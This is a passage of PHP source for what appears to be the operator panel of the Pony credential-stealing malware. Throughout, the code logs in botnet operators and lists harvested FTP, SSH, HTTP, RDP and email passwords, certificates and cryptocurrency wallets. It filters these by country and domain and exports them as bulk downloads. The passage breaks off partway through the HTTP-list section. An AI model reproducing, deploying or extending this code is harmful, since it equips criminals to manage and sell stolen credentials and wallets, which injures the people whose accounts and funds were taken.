<?php

// show all errors
error_reporting(E_ALL & ~E_DEPRECATED);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
session_set_cookie_params(86400);
session_start();

// make sure included files do not generate extra output
ob_start();

if (!isset($proxy_config))
{
    // use local config file
	$config_file = "config.php";
} else
{
	// use proxy config file
	$config_file = $proxy_config;
}

file_exists($config_file) or die();

require_once($config_file);
require_once("includes/lang.php");
require_once("includes/misc.php");
require_once("includes/password_modules.php");
require_once("includes/database.php");

// clean output buffer
ob_end_clean();

// white list processing code
if (isset($white_list) && is_array($white_list))
{
	if (count($white_list) && array_search(get_client_ip(), $white_list, true) === false)
	{
		header("HTTP/1.0 404 Not Found");	
		header("Status: 404 Not Found");
		$_SERVER['REDIRECT_STATUS'] = 404;
		if (file_exists('404.html'))
			echo file_get_contents('404.html');
		die();
	}
}

// connect and validate database
$pony_db = new pony_db();
$pony_db->connect_db($mysql_host, $mysql_user, $mysql_pass, $mysql_database, true);

// set cookie name
// cookie should be different for each script
$config_cookie_name = 'auth_cookie';
if (isset($proxy_id))
{
	$config_cookie_name = 'auth_cookie_'.$proxy_id;
}

// set report decryption password
$pony_db_report_password = $pony_db->get_option('report_password', '', REPORT_DEFAULT_PASSWORD);
// set report parsing options
$pony_report_options = array('sftp_user' => $pony_db->get_option('sftp_user', '', '1'),
							 'sftp_port' => $pony_db->get_option('sftp_port', '', '1'),
							 'sftp_protocol' => $pony_db->get_option('sftp_protocol', '', '1'));

// default values for unset config variables
if (!isset($show_help_to_users))
	$show_help_to_users = true;
if (!isset($show_http_to_users))
	$show_http_to_users = true;
if (!isset($show_logons_to_users))
	$show_logons_to_users = true;
if (!isset($show_other_to_users))
	$show_other_to_users = true;
if (!isset($enable_http_mode))
	$enable_http_mode = false;
if (!isset($disable_ip_logger))
	$disable_ip_logger = false;
if (!isset($enable_email_mode))
	$enable_email_mode = false;
if (!isset($show_email_to_users))
	$show_email_to_users = true;
if (!isset($show_domains))
	$show_domains = false;
if (!isset($show_domains_to_users))
	$show_domains_to_users = true;

// initialize CSRF token
if (!isset($_SESSION['token'])) 
{
	$token = md5(uniqid(rand(), TRUE));
	$_SESSION['token'] = $token;
}
else
{
	$token = $_SESSION['token'];
}

// initialize smarty
define('SMARTY_DIR', str_replace("\\", "/", getcwd()).'/includes/Smarty-3.1.15/libs/');
require_once(SMARTY_DIR . 'Smarty.class.php');
require_once(SMARTY_DIR . 'SmartyPaginate.class.php');
function escFilter($content)
{ 
   return htmlspecialchars($content, ENT_QUOTES, 'cp1251');
}
$smarty = new Smarty();
$smarty->setCacheDir($global_temporary_directory.'/');
$smarty->setCompileDir($global_temporary_directory.'/');
$smarty->setTemplateDir('includes/templates/');
$smarty->registerFilter('variable', 'escFilter');
$smarty->loadFilter('output', 'trimwhitespace');
$smarty->caching = false;
$smarty->assign('show_help_to_users', $show_help_to_users);
$smarty->assign('show_http_to_users', $show_http_to_users);
$smarty->assign('show_logons_to_users', $show_logons_to_users);
$smarty->assign('show_other_to_users', $show_other_to_users);
$smarty->assign('enable_http_mode', $enable_http_mode);
$smarty->assign('disable_ip_logger', $disable_ip_logger);
$smarty->assign('enable_email_mode', $enable_email_mode);
$smarty->assign('show_email_to_users', $show_email_to_users);
$smarty->assign('show_domains', $show_domains);
$smarty->assign('show_domains_to_users', $show_domains_to_users);
$smarty->assign('token', $token);

// initialize common used variables
$self_file = $_SERVER['SCRIPT_NAME'];
$authentication_login = trim(assign($_REQUEST['login']));
$authentication_password = trim(assign($_REQUEST['password']));
$authentication_success = false;
$authentication_attempt = isset($_REQUEST['login']) && isset($_REQUEST['password']);
$authentication_save_password = trim(assign($_REQUEST['save_password']));
$admin_action = trim(assign($_REQUEST['action']));
$auth_cookie = trim(assign($_COOKIE[$config_cookie_name]));
$admin_routine = trim(assign($_REQUEST['routine']));
$use_zip = trim(assign($_REQUEST['zip'])) == '1';

// filter available action pages
if (array_search($admin_action, array('ftp', 'http', 'stats', 'ping', 'log', 'admin', 'exit', 'help', 'chart', 'reports', 'other')) === false)
{
	$admin_action = '';
}

// authentication
if (!$authentication_attempt)
{
	$authentication_login = trim(assign($_REQUEST['login']));
	$authentication_password = trim(assign($_REQUEST['password']));
	$authentication_attempt = isset($_REQUEST['login']) && isset($_REQUEST['password']);
}

// try to authenticate
if (strlen($authentication_login) && strlen($authentication_password) && $pony_db->authenticate($authentication_login, $authentication_password))
{
	$authentication_success = true;

	// set cookie on successful authentication
	$cookie_save_password = $authentication_save_password;
	if ($cookie_save_password)
		$cookie_exp_time = time()+60*60*24*60; // 2 months
	else
		$cookie_exp_time = 0;

	setcookie($config_cookie_name, $pony_db->auth_cookie, $cookie_exp_time);
} else
{
	// authentication failed
	// try to authenticate using cookie
	if ($auth_cookie)
	{
		$authentication_success = $pony_db->autneticate_cookie($auth_cookie);
		if ($authentication_success)
			$authentication_login = $pony_db->login;
	}
}

// ajax ping code
// should be displayed before authorization form
if ($admin_routine == 'ping' && $admin_action == 'ping' && $authentication_success && $token === assign($_REQUEST['token']) && ($show_domains && ($pony_db->priv_is_admin() || $show_domains_to_users)))
{
	$domain_id = trim(assign($_REQUEST['domain_id']));
	$find_domain_result = $pony_db->find_domain($domain_id);

	if (is_array($find_domain_result) && $find_domain_result && count($find_domain_result) == 3)
	{
		list($ping_url, $ping_time, $ping_status) = $find_domain_result;
		
		if (curl_ping($ping_url))
		{
			$pony_db->update_domain($domain_id, 'OK');
			die("<span class=\"check\"></span>");
		}
	}		
	$pony_db->update_domain($domain_id, 'FAIL');
	die("<span class=\"cross\"></span>");
}

if ($admin_action == 'chart' && strlen($admin_routine) && $authentication_success && $token === assign($_REQUEST['token']))
{
	require_once('includes/chart.php');
	die();
}

// these variables available can be set after authentication only
$smarty->assign('priv_is_admin', $pony_db->priv_is_admin());
$smarty->assign('priv_can_delete', $pony_db->priv_can_delete());
$smarty->assign('authentication_success', $authentication_success);

function smarty_assign_continents($smarty)
{
	$smarty_geo_continents = array();
	$geo_ip = new GeoIP();
	$k = 0;
	for ($i = 0; $i < count($geo_ip->GEOIP_CONTINENT_CODES); $i++)
	{
		if (strlen($geo_ip->GEOIP_COUNTRY_NAMES[$i]))
		{
			if (!isset($smarty_geo_continents[$geo_ip->GEOIP_CONTINENT_CODES[$i]]))
			{
				$smarty_geo_continents[$geo_ip->GEOIP_CONTINENT_CODES[$i]][$k]['name'] = '(all)';
				$smarty_geo_continents[$geo_ip->GEOIP_CONTINENT_CODES[$i]][$k++]['code'] = 'all';
			}
			{
				$smarty_geo_continents[$geo_ip->GEOIP_CONTINENT_CODES[$i]][$k]['name'] = $geo_ip->GEOIP_COUNTRY_NAMES[$i];
				$smarty_geo_continents[$geo_ip->GEOIP_CONTINENT_CODES[$i]][$k++]['code'] = $geo_ip->GEOIP_COUNTRY_CODES[$i];
			}
		}
	}
	
	$smarty->assign('geo_continents', $smarty_geo_continents);
}

function apply_data_filters($smarty, $do_download, $mode = 'ftp')
{
	global $pony_db;

	$filter_include_ftp = trim(assign($_REQUEST['filter_include_ftp']));
	$filter_include_ssh = trim(assign($_REQUEST['filter_include_ssh']));

	$filter_include_http = trim(assign($_REQUEST['filter_include_http']));
	$filter_include_https = trim(assign($_REQUEST['filter_include_https']));

	$filter_trim_dirs = trim(assign($_REQUEST['filter_trim_dirs']));
	if ($filter_trim_dirs != '1')
		$filter_trim_dirs = '';

	if ($mode == 'ftp')
	{
		// include ftp/ssh
		if ($filter_include_ftp == '1' && $filter_include_ssh == '1')
			$include_subtypes = 'both';
		else if ($filter_include_ssh)
			$include_subtypes = 'ssh';
		else
			$include_subtypes = 'ftp';
	} else
	{
		// include http/https
		if ($filter_include_http == '1' && $filter_include_https == '1')
			$include_subtypes = 'both';
		else if ($filter_include_http)
			$include_subtypes = 'http';
		else
			$include_subtypes = 'https';
	}
	
	// include domains
	$include_domains = trim(assign($_REQUEST['filter_domains_include']));

	// exclude domains
	$exclude_domains = trim(assign($_REQUEST['filter_domains_exclude']));

	// text substring
	$filter_text = trim(assign($_REQUEST['filter_text']));

	// date filter
	$filter_date_from = trim(assign($_REQUEST['filter_date_from']));
	$filter_date_to = trim(assign($_REQUEST['filter_date_to']));

	// export ip setting
	$filter_export_ip = trim(assign($_REQUEST['filter_export_ip']));
	if ($filter_export_ip != '1')
		$filter_export_ip = '';

	// country filter
	$filter_country = array();
	$geo_ip = new GeoIP();

	foreach ($geo_ip->GEOIP_CONTINENT_CODES as $continent_code)
	{
		if (isset($_REQUEST['country_'.strtolower($continent_code)]) && is_array($_REQUEST['country_'.strtolower($continent_code)]))
		{
			foreach ($_REQUEST['country_'.strtolower($continent_code)] as $country_code)
			{
				if (strlen(trim($country_code)) && $country_code != 'all')
				{
					$filter_country[trim($country_code)] = 1;
				}
			}
		}
	}

	// when all countries are marked, do not apply country exclude filter
	if (count($filter_country) == count($geo_ip->GEOIP_COUNTRY_CODES)-1)
	{
		$filter_country = array();
	}

	$ftp_list = array();
	if (strlen($filter_include_ftp) || strlen($filter_include_ssh) || strlen($filter_trim_dirs) || strlen($filter_include_http) || strlen($filter_include_https) || count($filter_country) || strlen($include_domains) || strlen($exclude_domains) || strlen($filter_date_from) || strlen($filter_date_to) ||
	    strlen($filter_text) || strlen($filter_export_ip))
	{
		if ($mode == 'ftp')
		{
			$filtered_items = $pony_db->get_ftp_list($do_download, $ftp_list, 0, $include_subtypes, 0, $filter_date_from, $filter_date_to, $filter_country, $include_domains, $exclude_domains, $filter_trim_dirs, !$do_download, $filter_text, $filter_export_ip);
		}
		else
		{
			$filtered_items = $pony_db->get_http_list($do_download, $ftp_list, 0, $include_subtypes, 0, $filter_date_from, $filter_date_to, $filter_country, $include_domains, $exclude_domains, $filter_trim_dirs, !$do_download, $filter_text, $filter_export_ip);
		}

		// filter preview
		if ($filtered_items !== false && isset($filtered_items['list']) && isset($filtered_items['count']))
		{
			if (is_array($filtered_items['list']))
			{
				foreach ($filtered_items['list'] as $ftp_item=>$ftp_value)
				{
					if (!$pony_db->report_id_exists($filtered_items['list'][$ftp_item]['report_id']))
					{
						$filtered_items['list'][$ftp_item]['report_id'] = '';
					}
				}
			}

			$smarty->assign('filtered_items_count', $filtered_items['count']);
			$smarty->assign('filtered_items_list', $filtered_items['list']);
		}
	}
}

if ($authentication_success)
{
	// successfull authentication
	
	// log it
	if ($authentication_attempt)
	{
		if (!$disable_ip_logger)
		{
			$pony_db->add_log_line(get_client_ip(), CLOG_SOURCE_LOGIN, null, $authentication_login);
		}
	}
}  else if (!$authentication_attempt) 
{
	// didn't try to authenticate the user
	// show authentication form
	$smarty->display('header.tpl');
	$smarty->display('login_form.tpl');
	$smarty->display('footer.tpl');
	die();
} else
{
	// tried to authenticate the user, but failed
	// show error message
	$smarty->display('header.tpl');
	show_smarty_error($smarty, 'ERR_WRONG_PASSWORD', '');
	$smarty->display('footer.tpl');
}

if ($admin_action == '' && $admin_routine == '' && $authentication_success)
{
  // workaround for saved password autologin
} else if ($admin_action == 'exit' || $token !== assign($_REQUEST['token']))
{
	$cookie_exp_time = 1;
	$pony_db->remove_auth_cookie($auth_cookie);
	setcookie($config_cookie_name, '', $cookie_exp_time);

	// destroy session
	$_SESSION = array();

	if (ini_get("session.use_cookies")) {
	    $params = session_get_cookie_params();
	    setcookie(session_name(), '', time() - 42000,
	        $params["path"], $params["domain"],
	        $params["secure"], $params["httponly"]
	    );
	}

	// redirect to authentication page
	header('Location: '.$self_file);

	session_destroy();
	die();
}

if (!$authentication_success)
{
	// authentication failed, stop script execution
	die();
}

function set_common_file_download_header($file_name = '', $content_type = 'text/plain')
{
	header("Pragma: public");
    header("Expires: 0"); 
    header("Pragma: no-cache");
    header("Cache-Control: no-store, no-cache, must-revalidate");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Cache-Control: private", false);
    header("Content-Type: $content_type"); 
    header("Content-Transfer-Encoding: binary");
    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
    header('Content-Disposition: attachment; filename="'.$file_name.'";');
}

if ($admin_routine == 'download_ftp' && $admin_action == 'ftp')
{
	if ($use_zip)
	{
		set_common_file_download_header('ftp_list.zip', 'application/zip');
		ob_start();
		$pony_db->get_ftp_list(true);
		$ftp_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('ftp_list.txt', $ftp_list_data);
	} else
	{
		set_common_file_download_header('ftp_list.txt');
		$pony_db->get_ftp_list(true);
	}
	die();
}
if ($admin_routine == 'download_ssh' && $admin_action == 'ftp')
{
	if ($use_zip)
	{
		set_common_file_download_header('ssh_list.zip', 'application/zip');
		ob_start();
	    $null_array = array();
		$pony_db->get_ftp_list(true, $null_array, 0, 'ssh');
		$ssh_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('ssh_list.txt', $ssh_list_data);
	} else
	{
		set_common_file_download_header('ssh_list.txt');
	    $null_array = array();
		$pony_db->get_ftp_list(true, $null_array, 0, 'ssh');
	}
	die();
}
if ($admin_routine == 'download_http' && $admin_action == 'http' && $enable_http_mode && ($show_http_to_users || $pony_db->priv_is_admin()))
{
	if ($use_zip)
	{
		set_common_file_download_header('http_list.zip', 'application/zip');
		ob_start();
		$pony_db->get_http_list(true);
		$http_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('http_list.txt', $http_list_data);
	} else
	{
		set_common_file_download_header('http_list.txt');
		$pony_db->get_http_list(true);
	}
	die();
}
if ($admin_routine == 'download_email' && $enable_email_mode && ($show_email_to_users || $pony_db->priv_is_admin()))
{
	if ($use_zip)
	{
		set_common_file_download_header('email_list.zip', 'application/zip');
		ob_start();
		$pony_db->get_email_list(true);
		$email_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('email_list.txt', $email_list_data);
	} else
	{
		set_common_file_download_header('email_list.txt');
		$pony_db->get_email_list(true);
	}
	die();
}
if ($admin_routine == 'download_email_smtp' && $enable_email_mode && ($show_email_to_users || $pony_db->priv_is_admin()))
{
	if ($use_zip)
	{
		set_common_file_download_header('email_smtp_list.zip', 'application/zip');
		ob_start();
		$null_list = array();
		$pony_db->get_email_list(true, $null_list, 0, 'smtp');
		$email_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('email_smtp_list.txt', $email_list_data);
	} else
	{
		set_common_file_download_header('email_smtp_list.txt');
		$pony_db->get_email_list(true, $null_list, 0, 'smtp');
	}
	die();
}
if ($admin_routine == 'download_rdp')
{
	if ($use_zip)
	{
		set_common_file_download_header('rdp_list.zip', 'application/zip');
		ob_start();
		$pony_db->get_rdp_list(true);
		$rdp_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('rdp_list.txt', $rdp_list_data);
	} else
	{
		set_common_file_download_header('rdp_list.txt');
		$pony_db->get_rdp_list(true);
	}
	die();
}
if ($admin_routine == 'download_reports' && $admin_action == 'ftp')
{
	set_common_file_download_header('reports.sql');
	$pony_db->export_reports(false);
	die();
}

if ($admin_routine == 'download_nonparsed_reports' && $admin_action == 'ftp')
{
	set_common_file_download_header('non_parsed_reports.sql');
	$pony_db->export_reports(true);
	die();
}

if ($admin_routine == 'download_log' && $admin_action == 'log')
{
	if ($use_zip)
	{
		set_common_file_download_header('log.zip', 'application/zip');
		ob_start();
	    $null_list = array();
		$pony_db->get_log_list($null_list, 0, 0, true);
		$log_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('log.txt', $log_list_data);
	} else
	{
		set_common_file_download_header('log.txt');
	    $null_list = array();
		$pony_db->get_log_list($null_list, 0, 0, true);
	}
	die();
}

if ($admin_routine == 'download_report' && $admin_action == 'reports')
{
	$report_id = trim(assign($_REQUEST['report_id']));
	$report_item_result = $pony_db->get_report_item($report_id);
	if ($pony_db->state && is_array($report_item_result))
	{
		set_common_file_download_header('report_'.strval(intval($report_id)).'.bin', 'application/octet-stream');
	    header("Content-Length: ".strlen($report_item_result['data']));
		echo $report_item_result['data'];
	} else
		die('Report not found!');
	die();
}
if ($admin_routine == 'filter_download' && $admin_action == 'ftp')
{
	if ($use_zip)
	{
		set_common_file_download_header('filtered_list.zip', 'application/zip');
		ob_start();
		apply_data_filters($smarty, true);
		$filter_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('filtered_list.txt', $filter_list_data);
	} else
	{
		set_common_file_download_header('filtered_list.txt');
		apply_data_filters($smarty, true);
	}
	die();
}
if ($admin_routine == 'filter_download' && $admin_action == 'http')
{
	if ($use_zip)
	{
		set_common_file_download_header('filtered_http_list.zip', 'application/zip');
		ob_start();
		apply_data_filters($smarty, true, 'http');
		$filter_list_data = ob_get_contents();
		ob_end_clean();
		create_zip_and_send('filtered_http_list.txt', $filter_list_data);
	} else
	{
		set_common_file_download_header('filtered_http_list.txt');
		apply_data_filters($smarty, true, 'http');
	}
	die();
}
if ($admin_routine == 'download_cert' && $admin_action == 'other')
{
	set_common_file_download_header('certificates.zip', 'application/zip');

    $pony_db->get_cert_zip();

	die();
}
if ($admin_routine == 'download_wallet' && $admin_action == 'other')
{
	set_common_file_download_header('wallets.zip', 'application/zip');

    $pony_db->get_wallet_zip();

	die();
}

    
$smarty->display('header.tpl');

my_flush();

function clear_floating_offsets($pony_db)
{
	$offsets = array('offset_url', 'offset_ftp_last', 'offset_http_last', 'offset_reports_last', 
		'offset_ftp_list', 'offset_http_list', 'data_sum', 'offset_nonparsed_reports_stats',
		'offset_nonparsed_reports_sum', 'offset_log_events_count', 'offset_report_duplicates',
		'offset_email_list');
	foreach ($offsets as $offset_to_clear)
	{
		$pony_db->set_multi_option($offset_to_clear, array(''));
	}
}

function smarty_assign_common_vars($smarty, $pony_db)
{
	$pony_db->lock_all_tables();
	$offset_url = $pony_db->get_multi_option('offset_url', 6);

	$url_password_stats = array();
	$pony_db->get_url_password_stats($url_password_stats, $offset_url[0]);
	if (!isset($url_password_stats['ftp']))
		$url_password_stats['ftp'] = '0';
	if (!isset($url_password_stats['ssh']))
		$url_password_stats['ssh'] = '0';
	if (!isset($url_password_stats['http']))
		$url_password_stats['http'] = '0';
	if (!isset($url_password_stats['https']))
		$url_password_stats['https'] = '0';
	if (!isset($url_password_stats['rdp']))
		$url_password_stats['rdp'] = '0';

	$url_password_stats['ftp'] += $offset_url[1];
	$url_password_stats['ssh'] += $offset_url[2];
	$url_password_stats['http'] += $offset_url[3];
	$url_password_stats['https'] += $offset_url[4];
	$url_password_stats['rdp'] += $offset_url[5];

	$pony_db->set_multi_option('offset_url', 
		array(
			$pony_db->get_auto_value(CPONY_FTP_TABLE),
			$url_password_stats['ftp'],
			$url_password_stats['ssh'],
			$url_password_stats['http'],
			$url_password_stats['https'],
			$url_password_stats['rdp']
		)
	);

    $smarty->assign('total_ftp_items_count', $url_password_stats['ftp']);
	$smarty->assign('total_http_items_count', strval(intval($url_password_stats['http']) + intval($url_password_stats['https'])));
	$smarty->assign('total_cert_items_count', $pony_db->get_table_row_count(CPONY_CERT_TABLE));
	$smarty->assign('total_wallet_items_count', $pony_db->get_table_row_count(CPONY_WALLET_TABLE));
	$smarty->assign('total_email_items_count', $pony_db->get_table_row_count(CPONY_EMAIL_TABLE));
	$smarty->assign('total_email_smtp_items_count', $pony_db->get_table_row_count(CPONY_EMAIL_TABLE, "WHERE protocol='smtp'"));
	$smarty->assign('total_ssh_items_count', $url_password_stats['ssh']);
    $smarty->assign('total_rdp_items_count', $url_password_stats['rdp']);
	$smarty->assign('total_reports_count', $pony_db->get_table_row_count(CPONY_REPORT_TABLE));

	$report_sum = $pony_db->get_multi_option('data_sum', 2);
	$total_reports_size = $report_sum[1] + $pony_db->get_report_sum('', $report_sum[0]);

	$pony_db->set_multi_option('data_sum',
		array(
			$pony_db->get_auto_value(CPONY_REPORT_DATA_TABLE),
			$total_reports_size,
		)
	);

	$smarty->assign('total_reports_size', $total_reports_size);

	$offset_report_duplicates = $pony_db->get_multi_option('offset_report_duplicates', 2);
	$report_duplicates = $offset_report_duplicates[1] + $pony_db->get_duplicate_report_count($offset_report_duplicates[0]);
	$smarty->assign('report_duplicates', $report_duplicates);
	$pony_db->set_multi_option('offset_report_duplicates',
		array(
			$pony_db->get_auto_value(CPONY_LOG_TABLE),
			$report_duplicates,
		)
	);

	$offset_nonparsed_reports = $pony_db->get_multi_option('offset_nonparsed_reports_stats', 2);
	$total_nonparsed_reports = $offset_nonparsed_reports[1] + $pony_db->get_table_row_count(CPONY_REPORT_TABLE, "WHERE report_id>='".mysql_real_escape_string($offset_nonparsed_reports[0])."' AND parsed='0'");
	$smarty->assign('total_nonparsed_reports', $total_nonparsed_reports);
	$pony_db->set_multi_option('offset_nonparsed_reports_stats',
		array(
			$pony_db->get_auto_value(CPONY_REPORT_TABLE),
			$total_nonparsed_reports,
		)
	);

	$offset_nonparsed_reports_sum = $pony_db->get_multi_option('offset_nonparsed_reports_sum', 2);
	$total_nonparsed_reports_sum = $offset_nonparsed_reports_sum[1] + $pony_db->get_report_sum_linked("WHERE parsed='0'", $offset_nonparsed_reports_sum[0]);
	$smarty->assign('total_nonparsed_report_size', $total_nonparsed_reports_sum);
	$pony_db->set_multi_option('offset_nonparsed_reports_sum',
		array(
			$pony_db->get_auto_value(CPONY_REPORT_TABLE),
			$total_nonparsed_reports_sum,
		)
	);

	$smarty->assign('total_nonparsed_report_size', $total_nonparsed_reports_sum);
	$smarty->assign('total_ftp_table_size', $pony_db->get_table_size(CPONY_FTP_TABLE));
	$smarty->assign('total_report_table_size', $pony_db->get_table_size(CPONY_REPORT_TABLE) + $pony_db->get_table_size(CPONY_REPORT_DATA_TABLE));
	$smarty->assign('total_log_table_size', $pony_db->get_table_size(CPONY_LOG_TABLE));
	$smarty->assign('total_cert_table_size', $pony_db->get_table_size(CPONY_CERT_TABLE));
	$smarty->assign('total_wallet_table_size', $pony_db->get_table_size(CPONY_WALLET_TABLE));
	$smarty->assign('total_email_table_size', $pony_db->get_table_size(CPONY_EMAIL_TABLE));

	$offset_log_events_count = $pony_db->get_multi_option('offset_log_events_count', 2);
	$log_events_count = $offset_log_events_count[1] + $pony_db->get_table_row_count(CPONY_LOG_TABLE, "WHERE log_id>='".mysql_real_escape_string($offset_log_events_count[0])."' AND (log_source<>'".mysql_real_escape_string(CLOG_SOURCE_LOGIN)."')");
	$smarty->assign('log_events_count', $log_events_count);
	$pony_db->set_multi_option('offset_log_events_count',
		array(
			$pony_db->get_auto_value(CPONY_LOG_TABLE),
			$log_events_count,
		)
	);

	$smarty->assign('server_time', mysql_now_date());
	$smarty->assign('db_size', $pony_db->get_db_size());

	$offset_ftp = $pony_db->get_multi_option('offset_ftp_last', 3);
	list($offset_ftp[0], $new_ftp_last_24_hours) = $pony_db->get_offset_value_count('WHERE ftp_id>=\''.mysql_real_escape_string($offset_ftp[0]).'\' AND (url_type=\'ftp\' OR url_type=\'ssh\') AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 1 DAY)', 'ftp_id', CPONY_FTP_TABLE);
	list($offset_ftp[1], $new_ftp_last_hour) = $pony_db->get_offset_value_count('WHERE ftp_id>=\''.mysql_real_escape_string($offset_ftp[1]).'\' AND (url_type=\'ftp\' OR url_type=\'ssh\') AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 1 HOUR)', 'ftp_id', CPONY_FTP_TABLE);
	list($offset_ftp[2], $new_ftp_last_10_minutes) = $pony_db->get_offset_value_count('WHERE ftp_id>=\''.mysql_real_escape_string($offset_ftp[2]).'\' AND (url_type=\'ftp\' OR url_type=\'ssh\') AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 10 MINUTE)', 'ftp_id', CPONY_FTP_TABLE);
	$smarty->assign('new_ftp_last_24_hours', $new_ftp_last_24_hours);
	$smarty->assign('new_ftp_last_hour', $new_ftp_last_hour);
	$smarty->assign('new_ftp_last_10_minutes', $new_ftp_last_10_minutes);

	$pony_db->set_multi_option('offset_ftp_last', 
		array(
			$offset_ftp[0],
			$offset_ftp[1],
			$offset_ftp[2],
		)
	);

	$offset_http = $pony_db->get_multi_option('offset_http_last', 3);
	list($offset_http[0], $new_http_last_24_hours) = $pony_db->get_offset_value_count('WHERE ftp_id>=\''.mysql_real_escape_string($offset_http[0]).'\' AND (url_type=\'http\' OR url_type=\'https\') AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 1 DAY)', 'ftp_id', CPONY_FTP_TABLE);
	list($offset_http[1], $new_http_last_hour) = $pony_db->get_offset_value_count('WHERE ftp_id>=\''.mysql_real_escape_string($offset_http[1]).'\' AND (url_type=\'http\' OR url_type=\'https\') AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 1 HOUR)', 'ftp_id', CPONY_FTP_TABLE);
	list($offset_http[2], $new_http_last_10_minutes) = $pony_db->get_offset_value_count('WHERE ftp_id>=\''.mysql_real_escape_string($offset_http[2]).'\' AND (url_type=\'http\' OR url_type=\'https\') AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 10 MINUTE)', 'ftp_id', CPONY_FTP_TABLE);
	$smarty->assign('new_http_last_24_hours', $new_http_last_24_hours);
	$smarty->assign('new_http_last_hour', $new_http_last_hour);
	$smarty->assign('new_http_last_10_minutes', $new_http_last_10_minutes);

	$pony_db->set_multi_option('offset_http_last', 
		array(
			$offset_http[0],
			$offset_http[1],
			$offset_http[2],
		)
	);

	$offset_reports = $pony_db->get_multi_option('offset_reports_last', 3);
	list($offset_reports[0], $new_reports_last_24_hours) = $pony_db->get_offset_value_count('WHERE report_id>=\''.mysql_real_escape_string($offset_reports[0]).'\' AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 1 DAY)', 'report_id', CPONY_REPORT_TABLE);
	list($offset_reports[1], $new_reports_last_hour) = $pony_db->get_offset_value_count('WHERE report_id>=\''.mysql_real_escape_string($offset_reports[1]).'\' AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 1 HOUR)', 'report_id', CPONY_REPORT_TABLE);
	list($offset_reports[2], $new_reports_last_10_minutes) = $pony_db->get_offset_value_count('WHERE report_id>=\''.mysql_real_escape_string($offset_reports[2]).'\' AND import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL 10 MINUTE)', 'report_id', CPONY_REPORT_TABLE);
	$smarty->assign('new_reports_last_24_hours', $new_reports_last_24_hours);
	$smarty->assign('new_reports_last_hour', $new_reports_last_hour);
	$smarty->assign('new_reports_last_10_minutes', $new_reports_last_10_minutes);

	$pony_db->set_multi_option('offset_reports_last', 
		array(
			$offset_reports[0],
			$offset_reports[1],
			$offset_reports[2],
		)
	);

	$cert_last_import = $pony_db->get_last_cert_date();
	if ($cert_last_import !== false)
	{
		$smarty->assign('cert_last_import', $cert_last_import);
	}

	$wallet_last_import = $pony_db->get_last_wallet_date();
	if ($wallet_last_import !== false)
	{
		$smarty->assign('wallet_last_import', $wallet_last_import);
	}

	$pony_db->unlock_all_tables();
}

// -------------------------------------------------------------------------------------------
//                                     Page processing code
// -------------------------------------------------------------------------------------------

if ($admin_action == 'ftp')
{
	// ---------------------------------------------------------------------------------------
	// FTP list

	if ($admin_routine == 'clear_ftp')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_FTP_TABLE,  "WHERE url_type='ftp'");
			clear_floating_offsets($pony_db);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}
	elseif ($admin_routine == 'clear_ssh')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_FTP_TABLE,  "WHERE url_type='ssh'");
			clear_floating_offsets($pony_db);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}

	$offset_ftp_list = $pony_db->get_multi_option('offset_ftp_list', 1);
	$ftp_list = array();
	$pony_db->get_ftp_list(false, $ftp_list, 10, 'both', $offset_ftp_list[0]);

	foreach ($ftp_list as $ftp_item=>$ftp_value)
	{
		$ftp_list[$ftp_item]['module'] = $ftp_list[$ftp_item]['ftp_client'];
		$ftp_list[$ftp_item]['ftp_client'] = module_name_to_client_name($ftp_list[$ftp_item]['ftp_client']);
		if (!$pony_db->report_id_exists($ftp_list[$ftp_item]['report_id']))
		{
			$ftp_list[$ftp_item]['report_id'] = '';
		}
	}

	if (count($ftp_list))
	{
		$first_id = $ftp_list[count($ftp_list)-1]['ftp_id'];
	} else
	{
		$first_id = 0;
	}

	$pony_db->set_multi_option('offset_ftp_list', array($first_id));

	apply_data_filters($smarty, false);
	smarty_assign_continents($smarty);
		
	smarty_assign_common_vars($smarty, $pony_db);
	$smarty->assign('ftp_list', $ftp_list);
	$smarty->display('ftp_list.tpl');
}
if ($admin_action == 'http')
{
	// ---------------------------------------------------------------------------------------
	// HTTP list

	smarty_assign_continents($smarty);

	if ($admin_routine == 'clear_http')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_FTP_TABLE,  "WHERE (url_type='http') OR (url_type='https')");
			clear_floating_offsets($pony_db);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}

	$offset_http_list = $pony_db->get_multi_option('offset_http_list', 1);
	$http_list = array();
	$pony_db->get_http_list(false, $http_list, 10, 'both', $offset_http_list[0]);

	foreach ($http_list as $http_item=>$http_value)
	{
		$http_list[$http_item]['module'] = $http_list[$http_item]['ftp_client'];
		$http_list[$http_item]['ftp_client'] = module_name_to_client_name($http_list[$http_item]['ftp_client']);
		if (!$pony_db->report_id_exists($http_list[$http_item]['report_id']))
		{
